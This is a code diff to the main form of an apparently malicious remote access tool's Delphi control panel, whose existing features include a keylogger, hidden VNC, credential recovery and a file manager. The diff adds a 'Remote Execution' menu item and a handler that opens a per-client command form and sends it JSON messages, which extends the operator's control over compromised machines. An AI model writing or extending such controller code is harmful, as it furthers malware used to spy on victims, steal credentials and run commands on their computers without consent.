@@ -17,6 +17,7 @@ uses
   UnitRemoteMonitoring,
   UnitKeylogger,
   UnitOpenURL,
+  UnitRemoteExecution,
   Vcl.WinXCtrls, Vcl.Imaging.jpeg, System.ImageList, Vcl.ImgList;
 
 type
@@ -49,6 +50,7 @@ type
     FileManager1     : TMenuItem;
     HiddenVNC1       : TMenuItem;
     Recovery1: TMenuItem;
+    RemoteExecution1: TMenuItem;
     GroupBox3: TGroupBox;
     Button2: TButton;
     ComboBox1: TComboBox;
@@ -121,6 +123,8 @@ type
     procedure EnsureRemoteMonitoringMenuItem;
     procedure EnsureKeyloggerMenuItem;
     procedure EnsureOpenURLMenuItem;
+    procedure EnsureRemoteExecutionMenuItem;
+    procedure RemoteExecution1Click(Sender: TObject);
 
     function  IsRealClientValue(const Value: string): Boolean;
     function  PreferClientValue(const NewValue, CurrentValue: string): string;
@@ -177,6 +181,7 @@ begin
   EnsureRemoteMonitoringMenuItem;
   EnsureKeyloggerMenuItem;
   EnsureOpenURLMenuItem;
+  EnsureRemoteExecutionMenuItem;
 
   ListView1.OnMouseDown := ListView1MouseDown;
 
@@ -313,6 +318,65 @@ begin
     PopupMenu1.Items.Add(OpenURL1);
   end;
   OpenURL1.OnClick := OpenURL1Click;
+end;
+
+procedure TForm1.EnsureRemoteExecutionMenuItem;
+begin
+  if not Assigned(PopupMenu1) then Exit;
+  if not Assigned(RemoteExecution1) then
+  begin
+    RemoteExecution1         := TMenuItem.Create(PopupMenu1);
+    RemoteExecution1.Caption := 'Remote Execution';
+    PopupMenu1.Items.Add(RemoteExecution1);
+  end;
+  RemoteExecution1.OnClick := RemoteExecution1Click;
+end;
+
+procedure TForm1.RemoteExecution1Click(Sender: TObject);
+var
+  SelectedLine: TncLine;
+  LInfo       : TClientInfo;
+  F11         : TForm11;
+  ClientID    : string;
+begin
+  if (FServerManager = nil) or (csDestroying in ComponentState) then Exit;
+
+  if ListView1.Selected = nil then
+  begin
+    MessageBox(Handle, 'Lütfen önce bir client seçin.', 'Remote Execution',
+               MB_OK or MB_ICONWARNING);
+    Exit;
+  end;
+
+  SelectedLine := TncLine(ListView1.Selected.Data);
+  if SelectedLine = nil then
+  begin
+    MessageBox(Handle, 'Seçili client bilgisi okunamadı.', 'Remote Execution',
+               MB_OK or MB_ICONERROR);
+    Exit;
+  end;
+
+  F11 := FServerManager.GetRemoteExecutionForm(SelectedLine);
+
+  if Assigned(F11) then
+  begin
+    F11.Show;
+    F11.BringToFront;
+    Exit;
+  end;
+
+  ClientID := 'Unknown';
+  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
+    ClientID := LInfo.ID;
+
+  F11 := TForm11.Create(Application);
+  FServerManager.RegisterRemoteExecutionForm(SelectedLine, F11);
+
+  F11.SetupForClient(SelectedLine, ClientID,
+                    FServerManager.SendJSON,
+                    FServerManager.UnregisterRemoteExecutionForm);
+  F11.Show;
+  F11.BringToFront;
 end;
 
 { ------------------------------------------------------------------ }
@@ -868,6 +932,7 @@ begin
   FServerManager.UnregisterOpenURLForm(aLine);
   FServerManager.UnregisterFileManagerForm(aLine);
   FServerManager.UnregisterHiddenVNCForm(aLine);
+  FServerManager.UnregisterRemoteExecutionForm(aLine);
 end;
 
 procedure TForm1.OnInfoReceived(aLine: TncLine; JSONObj: TJSONObject);
@@ -1219,6 +1284,3 @@ begin
 end;
 
 end.
-
-
-
